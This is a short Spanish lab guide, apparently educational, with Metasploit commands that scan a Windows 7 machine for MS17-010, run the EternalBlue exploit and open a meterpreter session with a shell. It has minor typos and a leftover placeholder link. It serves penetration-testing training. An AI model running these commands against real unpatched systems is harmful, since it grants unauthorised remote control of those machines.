Explotación de vulnerabilidad utilizando metasploit
===============
Este laboratorio es para fines educativos y su contenido no debe ser utilizado para fines ilícitos  

**Objetivos**
* Experimentar la explotación de una vulnerabilidad 
* Interactuar con la consola de comandos de comandos de metasploit. 
* Interactuar con la consola de comandos de meterpreter.  

**Requisitos**
* Máquina objetivo:Windows 7 , 64 bits, con el Firewall inactivo  
* Equipo Auditor: Kali Linux 

**Utilizar un scanner para detercar si el equipo es vulnerable a  MS17-010 **
Desde Kali LinuxInicie una sesión de terminal y escriba los siguientes comandos
msfconsole
Search ms17_10
use auxiliary/scanner/smb/smb_ms17_010 
set RHOSTS “Dirección IP del host windows 7 64bits”,
run 
 
  
Exploiting
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_s010_eternalblue) > show options 
msf exploit(ms17_010_eternalblue) > set RHOST < Rhost-id > 
msf exploit(ms17_010_eternalblue) > show options 
msf exploit(ms17_010_eternalblue) > exploit 
 
 
 
Post Exploitation 
Sysinfo
Getuid
Shell


Enlace para mayor información
----- https://www.metasploit.com/

Click [here](http://foo.com) to go somewhere.
